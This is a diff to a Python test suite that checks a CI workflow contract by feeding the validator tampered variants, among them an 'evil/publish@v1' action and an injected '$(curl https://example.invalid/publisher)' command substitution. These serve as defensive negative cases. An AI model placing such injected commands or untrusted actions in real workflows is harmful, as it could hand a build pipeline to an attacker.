@@ -317,7 +317,7 @@ class VeridistWorkflowContractTests(unittest.TestCase):
             ),
             "unknown action": baseline.replace("actions/checkout@v4", "evil/publish@v1", 1),
             "command substitution": baseline.replace(
-                "python tools/check_legacy_isolation.py",
+                "python python/tools/ci_scope.py legacy-gate",
                 "$(curl https://example.invalid/publisher)",
                 1,
             ),
